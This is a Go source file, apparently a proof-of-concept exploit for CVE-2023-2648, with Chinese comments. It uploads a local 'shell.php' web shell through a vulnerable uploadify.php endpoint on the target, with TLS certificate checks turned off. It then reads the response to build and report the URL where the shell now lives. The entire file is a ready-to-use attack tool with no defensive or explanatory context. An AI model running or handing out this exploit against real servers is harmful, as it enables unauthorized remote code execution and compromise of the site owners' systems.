package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"os"
	"regexp"
)

func CVE_2023_2648(targetURL string) string {
	// 设置发送的文件路径
	filePath := "shell.php"
	// 调用 NewRequest 方法创建请求对象
	buf := &bytes.Buffer{}
	writer := multipart.NewWriter(buf)
	// 添加文件
	fileWriter, err := writer.CreateFormFile("Filedata", filePath)
	if err != nil {
		panic(err)
	}

	// 打开文件并将其复制到表单的字节缓冲区中
	file, err := os.Open(filePath)
	if err != nil {
		panic(err)
	}
	defer file.Close()
	_, err = io.Copy(fileWriter, file)
	if err != nil {
		panic(err)
	}

	// 检查是否有错误发生
	if err := writer.Close(); err != nil {
		panic(err)
	}

	// 添加空文件
	writer.CreateFormFile("file", "")

	// 完成表单数据填充
	err = writer.Close()
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest("POST", targetURL+"/inc/jquery/uploadify/uploadify.php", buf)
	if err != nil {
		panic(err)
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	// 解决https证书问题
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}

	resp, err := client.Do(req)
	if err != nil {
		log.Print(err)
		return "err"
	}
	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		log.Print(err)
		return "err"
	}
	match, _ := regexp.MatchString(`^\d{10}$`, string(body))
	if resp.StatusCode == 200 && match {
		shellUrl := targetURL + "/attachment/" + string(body) + "/" + filePath
		log.Println("[+] 存在CVE-2023-2648漏洞：", shellUrl)
		return shellUrl
	} else {
		log.Println("[-] 不存在CVE-2023-2648漏洞")
		return "[-] 不存在CVE-2023-2648漏洞"
	}

}
